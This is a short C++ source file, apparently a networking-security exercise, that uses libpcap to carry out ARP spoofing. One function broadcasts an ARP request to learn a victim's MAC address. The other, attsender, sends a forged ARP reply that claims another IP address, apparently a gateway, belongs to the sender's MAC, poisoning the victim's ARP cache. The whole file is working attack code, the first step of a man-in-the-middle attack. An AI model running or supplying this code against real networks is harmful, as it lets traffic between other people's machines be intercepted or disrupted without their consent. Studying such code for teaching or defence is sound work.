#include "attack.h"

void getsmac(char* interface, uint8_t * smac, char * sip, Mac mmac, Ip mip) {

	char* dev = interface;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(-1);
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = mmac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = mmac;
	packet.arp_.sip_ = htonl(mip);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(sip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	EthArpPacket * recpacket;

	while (1) {
        struct pcap_pkthdr* header;
        const u_char* rpacket;
        int res = pcap_next_ex(handle, &header, &rpacket);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        // printf("%u bytes captured\n", header->caplen);
		// if(header->caplen != 60) continue;

        recpacket = (struct EthArpPacket*)(rpacket);
        //if it is not arp for me
		if(recpacket->eth_.type_ != htons(EthHdr::Arp) || recpacket->eth_.dmac_ != mmac) continue;
		if(recpacket->arp_.tmac_ != mmac || recpacket->arp_.tip_ != (Ip)htonl(mip)) continue;

		if(recpacket->arp_.sip_ == (Ip)htonl(Ip(sip))){
			memcpy(smac, recpacket->arp_.smac_, Mac::SIZE);
			// check smac address
			// for (int i = 0; i < 6; ++i)
			// 	printf(" %02x", (unsigned char)smac[i]);
			// printf("\n");
			break;
		}
	}
	pcap_close(handle);
}

void attsender(char* interface, Mac smac, char * sip, Mac mmac, Ip mip, char * tip){
	char* dev = interface;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(-1);
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = smac;
	packet.eth_.smac_ = mmac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = mmac;
	packet.arp_.sip_ = htonl(Ip(tip));
	packet.arp_.tmac_ = smac;
	packet.arp_.tip_ = htonl(Ip(sip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
